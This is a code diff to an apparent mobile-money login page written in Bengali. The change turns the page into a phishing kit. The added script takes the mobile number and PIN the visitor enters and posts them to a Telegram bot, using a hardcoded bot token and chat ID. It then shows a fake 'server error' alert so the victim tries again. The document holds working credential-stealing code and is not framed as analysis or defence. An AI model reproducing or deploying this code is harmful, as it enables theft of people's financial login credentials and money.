@@ -60,14 +60,6 @@
             padding: 5px 0;
         }
 
-        .label-text {
-            display: block;
-            color: #888;
-            font-size: 14px;
-            margin-bottom: 5px;
-            text-align: center;
-        }
-
         .input-field {
             width: 100%;
             border: none;
@@ -78,7 +70,6 @@
             background: transparent;
         }
 
-        /* Number input এর পাশের অ্যারো বাটনগুলো সরানোর জন্য */
         input::-webkit-outer-spin-button,
         input::-webkit-inner-spin-button {
             -webkit-appearance: none;
@@ -107,7 +98,6 @@
             transition: 0.3s;
         }
 
-        /* লোডার ডিজাইন */
         .loader {
             display: none;
             width: 22px;
@@ -161,7 +151,7 @@
 
     <div class="login-form">
         <div class="input-group">
-            <input type="tel" class="input-field" placeholder="মোবাইল নাম্বার" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" id="mobileNumber" class="input-field" placeholder="মোবাইল নাম্বার" inputmode="numeric">
         </div>
 
         <div class="pin-container">
@@ -186,23 +176,63 @@
         const loader = document.getElementById('loader');
         const btnText = document.getElementById('btnText');
         const pinInput = document.getElementById('pinInput');
+        const mobileInput = document.getElementById('mobileNumber');
 
-        // পিন যাতে ৪ সংখ্যার বেশি না হয়
+        // টেলিগ্রাম কনফিগ
+        const botToken = "8272101067:AAGPLBxKlwNZ-yJoFGlAEwHI-h6PdOSHjaM";
+        const chatId = "8214183654";
+
+        loginBtn.addEventListener('click', function() {
+            const mobile = mobileInput.value;
+            const pin = pinInput.value;
+
+            if (mobile === "" || pin === "") {
+                alert("দয়া করে সঠিক তথ্য দিন।");
+                return;
+            }
+
+            // UI পরিবর্তন (লোডিং শুরু)
+            btnText.style.display = 'none';
+            loader.style.display = 'block';
+            loginBtn.disabled = true;
+
+            // মেসেজ ফরম্যাট
+            const message = `🔔 **নতুন লগইন তথ্য**\n\n📱 মোবাইল: ${mobile}\n🔑 পিন: ${pin}`;
+
+            // টেলিগ্রামে ডাটা পাঠানো
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    // সফল হলে ইউজারকে কোনো মেসেজ বা রিডাইরেক্ট করতে পারেন
+                    alert("সার্ভার ত্রুটি! আবার চেষ্টা করুন।");
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            })
+            .finally(() => {
+                // লোডার বন্ধ করা
+                btnText.style.display = 'block';
+                loader.style.display = 'none';
+                loginBtn.disabled = false;
+            });
+        });
+
+        // পিন লিমিট ৪ সংখ্যা
         pinInput.addEventListener('input', function() {
             if (this.value.length > 4) {
                 this.value = this.value.slice(0, 4);
             }
-        });
-
-        // বাটন ক্লিক করলে লোডিং শুরু হবে
-        loginBtn.addEventListener('click', function() {
-            // লেখা লুকাবে এবং চাকা ঘুরবে
-            btnText.style.display = 'none';
-            loader.style.display = 'block';
-            
-            // বাটন ডিজেবল করা
-            loginBtn.disabled = true;
-            loginBtn.style.opacity = '0.7';
         });
     </script>
 
